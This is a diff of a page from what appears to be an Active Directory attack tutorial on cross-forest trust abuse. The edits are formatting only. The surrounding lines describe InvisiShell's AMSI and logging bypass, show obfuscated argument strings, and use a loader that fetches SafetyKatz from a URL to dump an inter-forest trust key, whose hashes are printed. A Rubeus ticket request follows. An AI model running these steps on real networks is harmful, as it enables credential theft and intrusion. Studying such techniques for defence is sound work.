@@ -251,7 +251,7 @@ Let’s assume that we have compromised a Production(Users) Forest already and o
 InvisiShell is a tool designed to bypass security controls in PowerShell, allowing for the stealthy execution of scripts by circumventing enhanced logging mechanisms and detection by security software.
 Here’s a detailed explanation of how InvisiShell works:
 <ul>
-<li>Bypassing PowerShell Security Measures: InvisiShell is specifically created to bypass system-wide transcription, script block logging, and the Anti-Malware Scan Interface (AMSI). </li>
+<li>Bypassing PowerShell Security Measures: InvisiShell is specifically created to bypass system-wide transcription, script block logging, and the Anti-Malware Scan Interface (AMSI).</li>
 </ul>
 These are security features that Microsoft implemented to monitor and log PowerShell activity.
 <ul>
@@ -376,7 +376,7 @@ After this bypass let’s download Loader onto the target and leverage SafetyKat
 wget http://127.0.0.1:8080/Loader.exe -o C:\Users\Public\Loader.exe</p>
 
 OPSEC Alert: Next execution is performed under PowerShell rather than native cmd here to leverage CredSSP and bypass double hop issues.
-<pre><code>$z="t"
+<pre><code class="language-bash">$z="t"
 $y="s"
 $x="u"
 $w="r"
@@ -399,10 +399,10 @@ Let’s now use SafetyKatz and dump the Trust Key between [OUT]  Bastion.local �
 C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args "$Pwn /patch" "exit"
 <img src="./images/screenshot_482.png" alt="">
 
-<pre><code>Domain: BASTION.LOCAL (BASTION / S-1-5-21-284138346-1733301406-1958478260)
- [  In ] PRODUCTION.LOCAL -> BASTION.LOCAL
+<pre><code class="language-bash">Domain: BASTION.LOCAL (BASTION / S-1-5-21-284138346-1733301406-1958478260)
+ [  In ] PRODUCTION.LOCAL -&gt; BASTION.LOCAL
 
-[ Out ] BASTION.LOCAL -> PRODUCTION.LOCAL
+[ Out ] BASTION.LOCAL -&gt; PRODUCTION.LOCAL
     </em> 2/24/2025 9:04:32 PM - CLEAR   - 29 09 c3 19 5f 8c c4 ce 84 e5 8e 83 6f b8 b8 fc 28 0d c8 86 20 25 b8 34 24 05 cf 8b 7c 2b fe 31 39 ec 47 53 3c 32 7c 65 7b 1a fd 6d 10 9f f0 48 fb 7b 2f e7 4b 50 0d d5 59 3c f2 ce 79 42 fc 0f 4e 53 4c 8d 9e 48 fc 84 f3 23 c3 ad c4 a3 f7 6c 41 fc a7 71 91 d3 02 f9 98 db bd 8c 6b 9b a8 0f 94 81 01 af d0 b1 12 2b 0e 5d 6a 87 7d 7c 18 0a 25 74 df b3 95 9a 7b 47 f5 6e 37 27 ef 7c f3 61 99 87 22 c0 dc 58 69 ba 49 3a 57 d2 06 a8 27 9e 09 f7 4c b5 9d b2 57 12 62 1e 19 84 53 47 d2 96 7d 53 8b 4e 9f 81 76 b9 c5 49 5b 6a 9d 9b ff 5e 24 ab ca b9 4d 26 aa b3 32 f0 3a a0 be 8e 11 53 f8 71 ab af d7 ed 2c e2 91 f2 b5 32 aa 7e c8 f7 e4 e7 67 e3 9e dc 35 be 9a b1 46 c0 b2 23 d5 6b 24 5f f4 7a 89 60 13 63 b8 d5 82 ae 49 b9 97 c7
         <em> aes256_hmac       600a93e9fc91486a4987f089561df32feb2c841f0f6613767d1c98f6717be365
         </em> aes128_hmac       cdd811998ef3e7e1be93bbbf09f07687
@@ -412,7 +412,7 @@ C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args "$Pw
 From the current context, we have successfully extracted the Trust Key between bastion.local and production.local using SafetyKatz. This key allows us to forge authentication requests between the two forests, effectively breaking the expected security boundary. The output confirms that we retrieved aes256_hmac, aes128_hmac, and rc4_hmac_nt keys, which are used to encrypt authentication tickets. Specifically, we obtained the trust key for the direction Bastion → Production, meaning we can now leverage it to authenticate as PRODUCTION$ inside bastion.local.
 Now that we have extracted the trust key, our next step is to request a TGT (Ticket Granting Ticket) for PRODUCTION$ inside bastion.local and perform Pass-the-Ticket (PTT) to authenticate seamlessly. Using Rubeus, we issue an asktgt request with the RC4 trust key to obtain a valid Kerberos ticket for PRODUCTION$ in bastion.local. 
 We must once again encode the Rubeus Argument(asktgt) and copy/paste it into our PowerShell session as Administrator producation.local.
-<pre><code>$z="t"
+<pre><code class="language-bash">$z="t"
 $y="g"
 $x="t"
 $w="k"
@@ -455,7 +455,7 @@ net view \\bastion-dc.bastion.local
 
 
 
-          <div class="part-navigation">
+<div class="part-navigation">
             <a href="part-33-cross-forest-attacks-abusing-pamprivileged-managem.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Cross Forest Attacks - Abusing</a>
             <a href="part-35-cross-forest-attacks-abusing-trust-transitivity.html">Next: Cross Forest Attacks - Abusing <ion-icon name="arrow-forward-outline"></ion-icon></a>
           </div>
